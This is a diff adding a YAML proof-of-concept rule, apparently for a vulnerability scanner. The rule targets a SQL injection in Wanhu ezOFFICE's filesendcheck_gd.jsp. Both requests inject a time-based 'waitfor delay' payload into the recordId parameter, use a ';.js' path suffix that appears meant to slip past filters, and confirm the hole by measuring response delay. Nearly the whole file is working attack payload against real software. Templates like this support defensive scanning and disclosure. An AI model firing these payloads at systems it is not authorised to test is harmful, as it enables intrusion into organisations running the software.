@@ -1,0 +1,26 @@
+name: poc-yaml-wanhu-ezOFFICE-filesendcheck_gd.jsp-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:8'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487352&idx=1&sn=38251089953b5dee86637a463015d603&chksm=c267ba4bf510335d5b7e9bc50cb9ebc6b70a0c1f4dfdded934e14a9fca0ca34e16176c8695f7&token=286085064&lang=zh_CN#rd
+
